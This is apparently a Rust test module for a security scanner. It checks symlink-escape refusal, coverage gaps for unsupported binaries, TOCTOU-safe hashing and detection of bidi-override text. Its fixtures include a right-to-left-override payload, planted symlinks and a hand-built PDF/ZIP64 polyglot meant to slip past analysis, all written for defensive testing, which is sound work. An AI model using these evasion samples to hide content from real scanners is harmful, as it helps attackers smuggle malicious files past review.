        assert!(matches_ignore_pattern("docs/CLAUDE.md", "*/CLAUDE.md"));
        assert!(!matches_ignore_pattern("README.md", "*/CLAUDE.md"));
    }

    #[test]
    fn test_variation_selector_visible_in_scan() {
        // Variation selector U+FE0F (EF B8 8F) in a temp dir with no policy.
        let tmp = tempfile::tempdir().expect("create temp dir");
        let file_path = tmp.path().join("test_vs.txt");
        std::fs::write(&file_path, b"A\xef\xb8\x8f").expect("write temp file");

        let result = match scan_single_file(&file_path) {
            ScanFileOutcome::Scanned(r) => r,
            other => panic!("scan should succeed, got a skip: {:?}", other_kind(&other)),
        };

        // VariationSelector is Medium, so it must survive the default paranoia filter.
        let policy = crate::policy::Policy::discover(Some(tmp.path().to_str().unwrap()));
        let mut findings = result.findings;
        crate::engine::filter_findings_by_paranoia_vec(&mut findings, policy.paranoia);

        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == crate::verdict::RuleId::VariationSelector),
            "VariationSelector should be visible in scan at default paranoia: {findings:?}"
        );
    }

    #[test]
    fn test_negated_include_patterns() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        std::fs::write(tmp.path().join("a.md"), "hello").unwrap();
        std::fs::write(tmp.path().join("b.test.md"), "world").unwrap();
        std::fs::write(tmp.path().join("c.rs"), "fn main() {}").unwrap();

        // Include *.md but exclude *.test.md via negation
        let files = collect_files(
            tmp.path(),
            false,
            &[],
            &["*.md".to_string(), "!*.test.md".to_string()],
            &[],
        )
        .text_candidates;

        let names: Vec<&str> = files
            .iter()
            .filter_map(|p| p.file_name().and_then(|n| n.to_str()))
            .collect();
        assert!(names.contains(&"a.md"), "a.md should be included");
        assert!(
            !names.contains(&"b.test.md"),
            "b.test.md should be excluded by negation"
        );
        assert!(
            !names.contains(&"c.rs"),
            "c.rs should not match *.md include"
        );
    }

    /// F15: a SYMLINKED directory under the scan root must NOT be traversed, so a
    /// planted `subdir -> /outside` cannot pull files from outside the tree into
    /// the walk.
    #[cfg(unix)]
    #[test]
    fn symlinked_directory_is_not_traversed() {
        let root = tempfile::tempdir().expect("create scan root");
        let outside = tempfile::tempdir().expect("create outside tree");
        // A uniquely-named file OUTSIDE the scan root.
        std::fs::write(outside.path().join("escaped_unique_name.md"), "secret").unwrap();
        // A real in-tree file that SHOULD be collected.
        std::fs::write(root.path().join("inside.md"), "ok").unwrap();
        // root/link_dir -> <outside>.
        std::os::unix::fs::symlink(outside.path(), root.path().join("link_dir")).unwrap();

        let files = collect_files(root.path(), true, &[], &[], &[]).text_candidates;
        let names: Vec<&str> = files
            .iter()
            .filter_map(|p| p.file_name().and_then(|n| n.to_str()))
            .collect();
        assert!(
            names.contains(&"inside.md"),
            "the in-tree file must be collected"
        );
        assert!(
            !names.contains(&"escaped_unique_name.md"),
            "a file reached only via a symlinked directory must not be collected: {names:?}"
        );
    }

    /// F15: a SYMLINKED file is skipped by the walk, and a direct
    /// `scan_single_file` on a symlink refuses to read THROUGH it (`O_NOFOLLOW`),
    /// so neither path discloses a file the link points at outside the tree.
    #[cfg(unix)]
    #[test]
    fn symlinked_file_is_not_read_through() {
        let root = tempfile::tempdir().expect("create scan root");
        let outside = tempfile::tempdir().expect("create outside tree");
        let target = outside.path().join("leak.md");
        std::fs::write(&target, "SECRET_LEAK_CONTENT").unwrap();
        // root/leak.md -> <outside>/leak.md.
        let link = root.path().join("leak.md");
        std::os::unix::fs::symlink(&target, &link).unwrap();

        // The walk skips the symlinked leaf entirely.
        let files = collect_files(root.path(), true, &[], &[], &[]).text_candidates;
        assert!(
            files
                .iter()
                .all(|p| p.file_name().and_then(|n| n.to_str()) != Some("leak.md")),
            "a symlinked file must not be collected by the walk: {files:?}"
        );
        // And reading the symlink path directly is refused (no read-through): a
        // symlinked final component is an `Unreadable` coverage gap, NOT a scan.
        assert!(
            matches!(
                scan_single_file(&link),
                ScanFileOutcome::Skipped(CoverageGap {
                    kind: CoverageGapKind::Unreadable,
                    ..
                })
            ),
            "scan_single_file must refuse to read through a symlinked final component"
        );
    }

    #[test]
    fn test_negation_only_include_patterns() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        std::fs::write(tmp.path().join("a.md"), "hello").unwrap();
        std::fs::write(tmp.path().join("b.test.md"), "world").unwrap();
        std::fs::write(tmp.path().join("c.rs"), "fn main() {}").unwrap();

        // Only negation patterns (no positive includes) — include everything
        // except negated patterns
        let files =
            collect_files(tmp.path(), false, &[], &["!*.test.md".to_string()], &[]).text_candidates;

        let names: Vec<&str> = files
            .iter()
            .filter_map(|p| p.file_name().and_then(|n| n.to_str()))
            .collect();
        assert!(names.contains(&"a.md"), "a.md should be included");
        assert!(
            !names.contains(&"b.test.md"),
            "b.test.md should be excluded by negation"
        );
        assert!(
            names.contains(&"c.rs"),
            "c.rs should be included (no positive filter)"
        );
    }

    // ---- A2: coverage gaps, classification, hashing, security relevance ----

    /// An oversized priority/text file (> `MAX_FILE_SIZE`) yields an `Oversized`
    /// coverage gap whose sha256 equals an independent Rust-computed digest.
    /// NEVER shells out to `sha256sum`.
    #[test]
    fn oversized_priority_file_is_oversized_gap_with_matching_hash() {
        use sha2::{Digest, Sha256};
        let tmp = tempfile::tempdir().expect("create temp dir");
        // A PRIORITY file (CLAUDE.md) just over the analysis ceiling.
        let file_path = tmp.path().join("CLAUDE.md");
        let body = vec![b'x'; (MAX_FILE_SIZE as usize) + 16];
        std::fs::write(&file_path, &body).expect("write oversized file");

        let gap = match scan_single_file(&file_path) {
            ScanFileOutcome::Skipped(gap) => gap,
            ScanFileOutcome::Scanned(_) => panic!("an oversized file must be a coverage gap"),
        };
        assert_eq!(gap.kind, CoverageGapKind::Oversized);
        // The gap location points at the file.
        assert_eq!(
            gap.location.outer_path.as_deref(),
            Some(file_path.as_path())
        );

        // The recorded hash matches an independent digest of the whole file.
        let expected: String = hex::encode(Sha256::digest(&body));
        assert_eq!(gap.sha256.as_deref(), Some(expected.as_str()));

        // And it is security-relevant (a priority file), so it drives a finding.
        assert!(gap_is_security_relevant(&gap));
    }

    /// A `.so` is classified as an artifact candidate during collection and
    /// surfaces as an `Unsupported` coverage gap (never scanned as text, never a
    /// silent drop).
    #[test]
    fn native_so_is_unsupported_coverage_gap() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        std::fs::write(tmp.path().join("keep.md"), "hello").unwrap();
        // A native extension with some bytes so it can be hashed.
        let so = tmp.path().join("payload.abi3.so");
        std::fs::write(&so, b"\x7fELF not-really-but-enough").unwrap();

        let result = scan(&ScanConfig {
            path: tmp.path().to_path_buf(),
            recursive: true,
            fail_on: Severity::Critical,
            ignore_patterns: vec![],
            include_patterns: vec![],
            exclude_patterns: vec![],
            max_files: None,
        });

        let so_gap = result
            .coverage_gaps
            .iter()
            .find(|g| g.primary_path() == Some(so.as_path()))
            .expect("the .so must be recorded as a coverage gap");
        assert_eq!(so_gap.kind, CoverageGapKind::Unsupported);
        // A `.so` IS a security-relevant extension.
        assert!(gap_is_security_relevant(so_gap));
        // The ordinary text file was still scanned (not dropped by classification).
        assert!(result
            .file_results
            .iter()
            .any(|r| r.path.file_name().and_then(|n| n.to_str()) == Some("keep.md")));
    }

    /// The hash-budget boundary: a size over `MAX_COVERAGE_HASH_BYTES` classifies
    /// as `HashBudgetExceeded` (so a giant file is never hashed unbounded), while
    /// a size within it stays `Oversized`. Tested via the pure classifier so no
    /// multi-gigabyte file is created.
    #[test]
    fn hash_budget_boundary_classifies_correctly() {
        // Use a small synthetic budget for the boundary check.
        let budget = 1024;
        assert_eq!(
            oversized_gap_kind(budget, budget),
            CoverageGapKind::Oversized,
            "exactly at the budget is hashable (Oversized)"
        );
        assert_eq!(
            oversized_gap_kind(budget + 1, budget),
            CoverageGapKind::HashBudgetExceeded,
            "one byte over the budget is HashBudgetExceeded"
        );
        // A `HashBudgetExceeded` gap is security-relevant regardless of extension.
        let gap = CoverageGap {
            location: SubjectLocation::from_path("/tmp/huge.bin"),
            kind: CoverageGapKind::HashBudgetExceeded,
            sha256: None,
        };
        assert!(
            gap_is_security_relevant(&gap),
            "a too-big-to-hash file is security relevant on its own"
        );
    }

    /// An unreadable file (here a directory passed to `scan_single_file`, which
    /// the regular-file gate rejects) yields an `Unreadable` gap with no hash.
    #[test]
    fn unreadable_path_is_unreadable_gap() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        // A directory is not a regular file: the no-follow regular-file gate
        // refuses it, which the scan classifies as Unreadable.
        let gap = match scan_single_file(tmp.path()) {
            ScanFileOutcome::Skipped(gap) => gap,
            ScanFileOutcome::Scanned(_) => panic!("a directory must not scan as a file"),
        };
        assert_eq!(gap.kind, CoverageGapKind::Unreadable);
        assert!(gap.sha256.is_none(), "an unreadable file has no hash");
    }

    /// A non-security-relevant oversized text file is recorded as a gap but emits
    /// NO `AnalysisIncomplete` finding under the default policy (so benign size
    /// skips do not become noise), while a security-relevant gap does.
    #[test]
    fn analysis_incomplete_findings_gate_on_security_relevance() {
        let policy = crate::policy::Policy::default();

        // A plain (non-priority, non-security-extension) oversized text file.
        let benign = CoverageGap {
            location: SubjectLocation::from_path("/tmp/notes.txt"),
            kind: CoverageGapKind::Oversized,
            sha256: Some("deadbeef".into()),
        };
        assert!(!gap_is_security_relevant(&benign));
        assert!(
            build_analysis_incomplete_findings(std::slice::from_ref(&benign), &policy).is_empty(),
            "a benign oversized text file emits no finding by default"
        );

        // A security-relevant gap (a `.so`) emits a Medium AnalysisIncomplete.
        let so_gap = CoverageGap {
            location: SubjectLocation::from_path("/tmp/x.so"),
            kind: CoverageGapKind::Unsupported,
            sha256: None,
        };
        let findings = build_analysis_incomplete_findings(std::slice::from_ref(&so_gap), &policy);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].rule_id,
            crate::verdict::RuleId::AnalysisIncomplete
        );
        assert_eq!(findings[0].severity, Severity::Medium);
    }

    /// When the effective policy action for a gap class is `Fail`, the
    /// `AnalysisIncomplete` finding is High (whence the action derives to Block);
    /// an `Ignore` action suppresses the finding entirely.
    #[test]
    fn analysis_incomplete_severity_follows_policy_action() {
        use crate::policy::GapAction;
        let so_gap = CoverageGap {
            location: SubjectLocation::from_path("/tmp/x.so"),
            kind: CoverageGapKind::Unsupported,
            sha256: None,
        };

        // Fail -> High.
        let mut policy = crate::policy::Policy::default();
        policy.scan.unsupported_artifact_action = Some(GapAction::Fail);
        let findings = build_analysis_incomplete_findings(std::slice::from_ref(&so_gap), &policy);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);

        // Ignore -> no finding.
        let mut policy = crate::policy::Policy::default();
        policy.scan.unsupported_artifact_action = Some(GapAction::Ignore);
        assert!(
            build_analysis_incomplete_findings(std::slice::from_ref(&so_gap), &policy).is_empty(),
            "an ignored gap class emits no finding"
        );
    }

    /// A directly-named `.so` passed to `scan_single_file` (the `scan --file`
    /// path) is an `Unsupported` coverage gap with a best-effort hash, NOT scanned
    /// as text.
    #[test]
    fn scan_single_file_on_artifact_is_unsupported_gap() {
        use sha2::{Digest, Sha256};
        let tmp = tempfile::tempdir().expect("create temp dir");
        let so = tmp.path().join("lib.so");
        let bytes = b"\x7fELF some native bytes";
        std::fs::write(&so, bytes).unwrap();

        let gap = match scan_single_file(&so) {
            ScanFileOutcome::Skipped(gap) => gap,
            ScanFileOutcome::Scanned(_) => panic!("a .so must not be scanned as text"),
        };
        assert_eq!(gap.kind, CoverageGapKind::Unsupported);
        let expected: String = hex::encode(Sha256::digest(bytes));
        assert_eq!(gap.sha256.as_deref(), Some(expected.as_str()));
    }

    #[test]
    fn utf8_attack_payloads_with_png_and_so_suffixes_are_scanned_directly_and_in_walks() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        let payload = "visible\u{202e}hidden";
        let paths = [
            tmp.path().join("payload.png"),
            tmp.path().join("payload.so"),
        ];
        for path in &paths {
            std::fs::write(path, payload).unwrap();
            let result = match scan_single_file(path) {
                ScanFileOutcome::Scanned(result) => result,
                ScanFileOutcome::Skipped(gap) => {
                    panic!("valid UTF-8 must beat a misleading suffix: {:?}", gap.kind)
                }
            };
            assert!(result
                .findings
                .iter()
                .any(|finding| finding.rule_id == crate::verdict::RuleId::BidiControls));
        }

        let walked = scan_tree(tmp.path(), None);
        for path in &paths {
            let result = walked
                .file_results
                .iter()
                .find(|result| result.path.as_path() == path.as_path())
                .expect("the directory walk must analyze UTF-8 regardless of suffix");
            assert!(result
                .findings
                .iter()
                .any(|finding| finding.rule_id == crate::verdict::RuleId::BidiControls));
            assert!(walked
                .coverage_gaps
                .iter()
                .all(|gap| gap.primary_path() != Some(path.as_path())));
        }
    }

    /// A directly-named single `.so` file passed to the collection helper is
    /// still queued through the artifact scheduling bucket, but the driver will
    /// byte-classify it before choosing an analyzer.
    #[test]
    fn directly_named_artifact_file_is_artifact_candidate() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        let so = tmp.path().join("lib.so");
        std::fs::write(&so, b"bytes").unwrap();
        let collected = collect_files(&so, false, &[], &[], &[]);
        assert!(
            collected.text_candidates.is_empty(),
            "a .so must not be a text candidate"
        );
        assert_eq!(
            collected.artifact_candidates,
            vec![so],
            "a directly named .so is an artifact candidate"
        );
    }

    /// A `.whl` is an `Unsupported` artifact gap AND security-relevant, so an
    /// unanalyzable wheel can't read as clean (CodeRabbit #152: `.whl` was missing
    /// from `SECURITY_RELEVANT_EXTENSIONS`).
    #[test]
    fn whl_unsupported_gap_is_security_relevant() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        let whl = tmp.path().join("pkg-1.0-py3-none-any.whl");
        std::fs::write(&whl, b"PK\x03\x04 not a real wheel").unwrap();
        let gap = match scan_single_file(&whl) {
            ScanFileOutcome::Skipped(gap) => gap,
            ScanFileOutcome::Scanned(_) => panic!("a .whl must not be scanned as text"),
        };
        assert_eq!(gap.kind, CoverageGapKind::Unsupported);
        assert!(
            gap_is_security_relevant(&gap),
            "a .whl gap must be security-relevant"
        );
    }

    #[test]
    fn pdf_first_large_zip64_polyglot_is_never_scanned_as_exclusive_pdf() {
        const EXTENSIBLE_BYTES: usize = 1024 * 1024 + 1;
        let mut bytes = b"%PDF-1.7\n%%EOF\n".to_vec();
        let mut record = vec![0u8; 56 + EXTENSIBLE_BYTES];
        record[..4].copy_from_slice(b"PK\x06\x06");
        record[4..12].copy_from_slice(&(44u64 + EXTENSIBLE_BYTES as u64).to_le_bytes());
        record[12..14].copy_from_slice(&45u16.to_le_bytes());
        record[14..16].copy_from_slice(&45u16.to_le_bytes());
        bytes.extend_from_slice(&record);

        let mut locator = [0u8; 20];
        locator[..4].copy_from_slice(b"PK\x06\x07");
        locator[16..20].copy_from_slice(&1u32.to_le_bytes());
        bytes.extend_from_slice(&locator);
        let mut eocd = [0u8; 22];
        eocd[..4].copy_from_slice(b"PK\x05\x06");
        eocd[8..10].copy_from_slice(&u16::MAX.to_le_bytes());
        eocd[10..12].copy_from_slice(&u16::MAX.to_le_bytes());
        eocd[12..16].copy_from_slice(&u32::MAX.to_le_bytes());
        eocd[16..20].copy_from_slice(&u32::MAX.to_le_bytes());
        bytes.extend_from_slice(&eocd);

        let classification = crate::content_kind::classify_with_ambiguity(&bytes);
        assert_eq!(classification.kind, crate::content_kind::ContentKind::Pdf);
        assert!(classification.ambiguous_pdf_ownership);

        let tmp = tempfile::tempdir().expect("create temp dir");
        let path = tmp.path().join("polyglot-1.0-py3-none-any.whl");
        std::fs::write(&path, &bytes).unwrap();
        let gap = match scan_single_file(&path) {
            ScanFileOutcome::Skipped(gap) => gap,
            ScanFileOutcome::Scanned(_) => {
                panic!("PDF-first ZIP64 polyglot must not enter exclusive PDF analysis")
            }
        };
        assert_eq!(gap.kind, CoverageGapKind::Unsupported);
        assert!(gap.sha256.is_some());
        assert!(gap_is_security_relevant(&gap));

        let mut policy = crate::policy::Policy::default();
        policy.scan.unsupported_artifact_action = Some(crate::policy::GapAction::Fail);
        let findings = build_analysis_incomplete_findings(&[gap], &policy);
        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete));
    }

    #[test]
    fn malformed_exclusive_pdf_retains_findings_and_typed_coverage_gap() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        let path = tmp.path().join("malformed.pdf");
        let bytes = b"%PDF-1.7\nnot a complete PDF\n%%EOF\n";
        std::fs::write(&path, bytes).unwrap();

        let file = match scan_single_file(&path) {
            ScanFileOutcome::Scanned(file) => file,
            ScanFileOutcome::Skipped(gap) => {
                panic!("owned PDF analysis must retain its file result: {gap:?}")
            }
        };
        assert!(file.has_analysis_incomplete_finding());
        assert!(file.analysis_incomplete());
        assert_eq!(file.coverage_gaps.len(), 1);
        assert_eq!(
            file.coverage_gaps[0].kind,
            CoverageGapKind::PdfAnalyzerIncomplete
        );
        assert_eq!(file.coverage_gaps[0].primary_path(), Some(path.as_path()));
        assert!(file.coverage_gaps[0].sha256.is_some());
        assert!(gap_is_security_relevant(&file.coverage_gaps[0]));

        let aggregate = scan(&ScanConfig {
            path: tmp.path().to_path_buf(),
            recursive: true,
            fail_on: Severity::Critical,
            ignore_patterns: Vec::new(),
            include_patterns: Vec::new(),
            exclude_patterns: Vec::new(),
            max_files: None,
        });
        assert!(aggregate.analysis_incomplete());
        assert!(aggregate.coverage_gaps.iter().any(|gap| {
            gap.kind == CoverageGapKind::PdfAnalyzerIncomplete
                && gap.primary_path() == Some(path.as_path())
        }));
    }

    #[test]
    fn malformed_pdf_stdin_has_typed_analyzer_coverage() {
        let bytes = b"%PDF-1.7\nnot a complete PDF\n%%EOF\n";
        let result = scan_stdin(&String::from_utf8_lossy(bytes), bytes);
        assert!(result.analysis_incomplete());
        assert_eq!(result.coverage_gaps.len(), 1);
        assert_eq!(
            result.coverage_gaps[0].kind,
            CoverageGapKind::PdfAnalyzerIncomplete
        );
        assert_eq!(
            result.coverage_gaps[0].primary_path(),
            Some(Path::new("<stdin>"))
        );
    }

    /// A non-UTF-8 filename with an artifact extension is still an `ArtifactCandidate`
    /// (CodeRabbit #152: a `to_str().unwrap_or("")` previously dropped it to text).
    #[test]
    #[cfg(unix)]
    fn non_utf8_artifact_name_is_classified_as_artifact() {
        use std::os::unix::ffi::OsStrExt;
        let name = std::ffi::OsStr::from_bytes(b"caf\xe9.so"); // invalid UTF-8 + .so
        assert_eq!(
            classify_collected_path(std::path::Path::new(name)),
            CollectedFileKind::ArtifactCandidate
        );
    }

    /// A coverage gap whose path is a non-UTF-8 artifact name (`café.so`) is still
    /// security-relevant: the extension gate must read the name lossily, not drop it to
    /// "" via `to_str` and let it slip past `require_complete` (CodeRabbit #152).
    #[test]
    #[cfg(unix)]
    fn non_utf8_gap_path_is_security_relevant() {
        use std::os::unix::ffi::OsStrExt;
        let name = std::ffi::OsStr::from_bytes(b"caf\xe9.so"); // invalid UTF-8 + .so
        let gap = CoverageGap {
            location: SubjectLocation::from_path(std::path::Path::new(name)),
            kind: CoverageGapKind::Unsupported,
            sha256: None,
        };
        assert!(
            gap_is_security_relevant(&gap),
            "a non-UTF-8 .so gap must be security-relevant"
        );
    }

    /// An artifact candidate matched by an explicit exclude pattern is an
    /// INTENTIONAL exclusion, not a coverage gap (so a repo can opt a `.so` out).
    #[test]
    fn excluded_artifact_is_not_a_gap() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        std::fs::write(tmp.path().join("keep.md"), "hi").unwrap();
        std::fs::write(tmp.path().join("vendor.so"), b"bytes").unwrap();

        let collected = collect_files(
            tmp.path(),
            true,
            &[],
            &[],
            &["*.so".to_string()], // exclude the artifact explicitly
        );
        assert!(
            collected.artifact_candidates.is_empty(),
            "an explicitly excluded .so is an intentional exclusion, not a gap"
        );
    }

    /// T2.7: `.dll`/`.exe`/`.jar`/`.class` are LOADABLE CODE, so a tree
    /// containing one records an `Unsupported` coverage gap (the same treatment as
    /// a `.so`) rather than a silent `BinaryIgnored` drop. A silent drop would make
    /// a planted native blob read as "clean" and slip past `require_complete`.
    #[test]
    fn dll_exe_jar_are_unsupported_gaps_not_clean() {
        // Each loadable-code extension classifies as an artifact candidate.
        for name in ["evil.dll", "evil.exe", "evil.jar", "evil.class"] {
            assert_eq!(
                classify_collected_file(name),
                CollectedFileKind::ArtifactCandidate,
                "{name} must be an artifact candidate, not BinaryIgnored"
            );
        }

        // A directory tree containing a structurally coherent PE DLL surfaces
        // an Unsupported gap. An ASCII sentence beginning with `MZ` is valid
        // UTF-8 text and deliberately does not prove binary identity.
        let tmp = tempfile::tempdir().expect("create temp dir");
        std::fs::write(tmp.path().join("readme.md"), "hi").unwrap();
        let pe = minimal_pe_dll_image();
        assert_eq!(
            crate::content_kind::classify(&pe),
            crate::content_kind::ContentKind::Pe
        );
        std::fs::write(tmp.path().join("evil.dll"), pe).unwrap();

        let config = ScanConfig {
            path: tmp.path().to_path_buf(),
            recursive: true,
            fail_on: Severity::High,
            ignore_patterns: Vec::new(),
            include_patterns: Vec::new(),
            exclude_patterns: Vec::new(),
            max_files: None,
        };
        let result = scan(&config);

        let dll_gap = result
            .coverage_gaps
            .iter()
            .find(|g| {
                g.primary_path()
                    .and_then(|p| p.file_name())
                    .and_then(|n| n.to_str())
                    == Some("evil.dll")
            })
            .expect("evil.dll must be recorded as a coverage gap");
        assert_eq!(
            dll_gap.kind,
            CoverageGapKind::Unsupported,
            "a .dll is an Unsupported coverage gap, not silently dropped"
        );

        // The gap is security-relevant, so `require_complete` (a Fail action) would
        // surface a finding: it must NOT read as clean.
        let mut policy = crate::policy::Policy::default();
        policy.scan.unsupported_artifact_action = Some(crate::policy::GapAction::Fail);
        let findings = build_analysis_incomplete_findings(&result.coverage_gaps, &policy);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == crate::verdict::RuleId::AnalysisIncomplete
                    && f.severity == Severity::High),
            "the .dll gap must yield a High AnalysisIncomplete finding under require_complete"
        );
    }

    #[test]
    fn utf8_dll_suffix_is_scanned_byte_first_not_reported_unsupported() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        let path = tmp.path().join("instructions.dll");
        std::fs::write(&path, "visible\u{202e}hidden").unwrap();

        let direct = match scan_single_file(&path) {
            ScanFileOutcome::Scanned(result) => result,
            ScanFileOutcome::Skipped(gap) => {
                panic!(
                    "valid UTF-8 must beat a .dll scheduling hint: {:?}",
                    gap.kind
                )
            }
        };
        assert!(direct
            .findings
            .iter()
            .any(|finding| finding.rule_id == crate::verdict::RuleId::BidiControls));

        let walked = scan_tree(tmp.path(), None);
        let result = walked
            .file_results
            .iter()
            .find(|result| result.path.as_path() == path.as_path())
            .expect("directory collection must retain and analyze a UTF-8 .dll");
        assert!(result
            .findings
            .iter()
            .any(|finding| finding.rule_id == crate::verdict::RuleId::BidiControls));
        assert!(walked
            .coverage_gaps
            .iter()
            .all(|gap| gap.primary_path() != Some(path.as_path())));
    }

    /// T2.8: the grow-during-read recovery hashes from the ALREADY-OPEN handle
    /// (rewound to the start), NOT by re-opening the path. Hashing from the same
    /// fd is the TOCTOU-safety point: a path swap between the read and a reopen
    /// could otherwise substitute a different inode. This proves the recovery
    /// digests the bytes the OPEN handle holds, independent of what the path
    /// resolves to.
    #[test]
    fn grow_during_read_hashes_from_same_handle() {
        use sha2::{Digest, Sha256};
        use std::io::{Read as _, Seek as _};

        let tmp = tempfile::tempdir().expect("create temp dir");
        let path = tmp.path().join("payload.bin");
        let handle_bytes = b"the exact bytes the open handle holds";
        std::fs::write(&path, handle_bytes).unwrap();

        // Open the SAME way `scan_single_file` does, then advance the cursor to
        // mimic the grow-detection read that leaves the fd at EOF.
        let file = crate::util::open_read_no_follow_capped(&path, u64::MAX).expect("open handle");
        let mut sink = Vec::new();
        (&file)
            .take(8)
            .read_to_end(&mut sink)
            .expect("partial read");

        // SWAP the inode at `path` by atomically renaming a different file over it.
        // The open `file` fd keeps the ORIGINAL inode (its bytes survive the
        // unlink), while the PATH now resolves to NEW, different content, so a
        // path-based re-open would hash the wrong bytes. (A plain truncate-rewrite
        // of the same path would modify the same inode the fd sees, defeating the
        // test, so the swap must replace the inode.)
        let swapped_bytes = b"COMPLETELY DIFFERENT CONTENT ON DISK";
        let decoy = tmp.path().join("decoy.bin");
        std::fs::write(&decoy, swapped_bytes).unwrap();
        std::fs::rename(&decoy, &path).expect("atomic swap of the path's inode");

        // The recovery used by the grow arm: rewind the handle, hash from it.
        (&file).seek(std::io::SeekFrom::Start(0)).expect("rewind");
        let recovered = match crate::util::sha256_from_handle(file, MAX_COVERAGE_HASH_BYTES) {
            Ok(crate::util::HashOutcome::Digest(hex)) => hex,
            other => panic!("expected a digest from the handle, got {other:?}"),
        };

        let from_handle: String = hex::encode(Sha256::digest(handle_bytes));
        let from_reopened_path: String = hex::encode(Sha256::digest(swapped_bytes));
        assert_eq!(
            recovered, from_handle,
            "the hash must be of the bytes read from the handle"
        );
        assert_ne!(
            recovered, from_reopened_path,
            "the hash must NOT be of a re-opened path's (swapped) content"
        );
    }

    /// T2.13: when several gaps' location strings are PREFIXES of one another
    /// (`/a/b.so` is a substring of `/a/b.so.bak`), each finding still resolves to
    /// its OWN exact member: the located builder pairs every finding with the exact
    /// `SubjectLocation` of its gap, so resolution is by exact equality, not a
    /// substring of the description.
    #[test]
    fn analysis_incomplete_finding_path_resolves_nested_member() {
        let policy = crate::policy::Policy::default();
        // Both are security-relevant (`.so`), and `/a/b.so` is a CONTIGUOUS
        // substring of `/a/b.so.extra.so`, the exact prefix collision a
        // description-substring match would mislabel.
        let gap_a = CoverageGap {
            location: SubjectLocation::from_path("/a/b.so"),
            kind: CoverageGapKind::Unsupported,
            sha256: None,
        };
        let gap_b = CoverageGap {
            location: SubjectLocation::from_path("/a/b.so.extra.so"),
            kind: CoverageGapKind::Unsupported,
            sha256: None,
        };
        // Guard the premise: the first location really is a substring of the
        // second, so a `description.contains(loc)` match WOULD collide.
        assert!(
            gap_b
                .location
                .to_string()
                .contains(&gap_a.location.to_string()),
            "test premise: /a/b.so must be a substring of /a/b.so.extra.so"
        );

        let located =
            build_analysis_incomplete_findings_located(&[gap_a.clone(), gap_b.clone()], &policy);
        assert_eq!(located.len(), 2, "one finding per security-relevant gap");

        // Each finding is paired with its OWN exact location, even though
        // `/a/b.so` is a substring of `/a/b.so.extra.so`.
        let loc_a = &located[0].0;
        let loc_b = &located[1].0;
        assert_eq!(loc_a, &gap_a.location);
        assert_eq!(loc_b, &gap_b.location);
        assert_eq!(
            loc_a.outer_path.as_deref(),
            Some(std::path::Path::new("/a/b.so"))
        );
        assert_eq!(
            loc_b.outer_path.as_deref(),
            Some(std::path::Path::new("/a/b.so.extra.so"))
        );
        assert_ne!(
            loc_a, loc_b,
            "the nested member must NOT collapse onto its prefix sibling"
        );
    }
}
